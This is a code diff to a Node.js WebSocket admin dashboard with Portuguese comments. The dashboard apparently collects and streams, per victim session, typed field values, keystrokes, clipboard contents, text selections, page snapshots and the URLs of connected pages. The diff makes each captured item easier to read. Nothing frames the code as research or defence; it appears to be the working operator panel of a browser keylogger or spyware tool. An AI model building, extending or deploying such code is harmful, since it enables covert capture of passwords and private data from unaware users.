@@ -160,6 +160,7 @@ app.get('/', (req, res) => {
     .highlight-click { color: #ff7b9c; }
     .highlight-key { color: #6dd5ed; }
     .highlight-clip { color: #b38bff; }
+    .highlight-handshake { color: #8be07a; }
     ::-webkit-scrollbar { width: 5px; }
     ::-webkit-scrollbar-track { background: #0b0d1a; }
     ::-webkit-scrollbar-thumb { background: #2a2f55; border-radius: 10px; }
@@ -203,13 +204,11 @@ app.get('/', (req, res) => {
       ws.onmessage = (e) => {
         const msg = JSON.parse(e.data);
         if (msg.type === 'update') {
-          // Atualiza o banco local
           if (!allData[msg.sess]) allData[msg.sess] = [];
           allData[msg.sess].push(msg);
           renderSidebar();
           if (selectedId === msg.sess) renderLogs(selectedId);
         } else if (msg.type === 'init') {
-          // Recebe todas as sessões existentes
           allData = msg.data || {};
           renderSidebar();
           if (Object.keys(allData).length > 0) {
@@ -252,18 +251,42 @@ app.get('/', (req, res) => {
       }
       let html = '';
       logs.forEach(log => {
-        const time = new Date(log.timestamp).toLocaleTimeString('pt-BR');
-        let content = log.value || log.key || log.text || log.target || JSON.stringify(log);
-        if (content.length > 100) content = content.slice(0, 100) + '…';
+        // CORREÇÃO DA DATA
+        const time = log.timestamp ? new Date(log.timestamp).toLocaleTimeString('pt-BR') : '—';
+
+        // CONTEÚDO MAIS LEGÍVEL POR TIPO
+        let content = '';
         let typeClass = '';
-        if (log.type === 'input') typeClass = 'highlight-input';
-        else if (log.type === 'click') typeClass = 'highlight-click';
-        else if (log.type === 'keydown') typeClass = 'highlight-key';
-        else if (log.type === 'clipboard') typeClass = 'highlight-clip';
-        
+        const type = log.type || 'unknown';
+        if (type === 'handshake') {
+          content = \`Nova conexão: \${log.url || 'desconhecida'}\`;
+          typeClass = 'highlight-handshake';
+        } else if (type === 'input') {
+          content = \`[\${log.name || 'campo'}] = "\${log.value || ''}"\`;
+          typeClass = 'highlight-input';
+        } else if (type === 'click') {
+          content = \`(\${log.x || 0}, \${log.y || 0}) em \${log.target || 'elemento'}\`;
+          typeClass = 'highlight-click';
+        } else if (type === 'keydown') {
+          content = \`Tecla: "\${log.key || ''}"\`;
+          if (log.ctrl) content += ' (Ctrl)';
+          if (log.shift) content += ' (Shift)';
+          typeClass = 'highlight-key';
+        } else if (type === 'clipboard') {
+          content = \`Copiou: "\${(log.content || '').slice(0, 80)}"\`;
+          typeClass = 'highlight-clip';
+        } else if (type === 'selection') {
+          content = \`Selecionou: "\${(log.text || '').slice(0, 80)}"\`;
+          typeClass = 'highlight-clip';
+        } else if (type === 'screenshot') {
+          content = \`Captura de tela (\${log.title || 'página'}) - \${log.html_len || 0} bytes\`;
+        } else {
+          content = JSON.stringify(log).slice(0, 120);
+        }
+
         html += \`<div class="log-entry">
           <span class="time">\${time}</span>
-          <span class="type-tag">\${log.type}</span>
+          <span class="type-tag">\${type}</span>
           <span class="content \${typeClass}">\${content}</span>
         </div>\`;
       });
@@ -300,7 +323,7 @@ wss.on('connection', (ws) => {
         if (!sessions[data.sess]) sessions[data.sess] = [];
         sessions[data.sess].push(data);
         
-        // Broadcat para todos os admins
+        // Broadcast para todos os admins
         adminClients.forEach(client => {
           if (client.readyState === WebSocket.OPEN) {
             client.send(JSON.stringify({ type: 'update', sess: data.sess, ...data }));
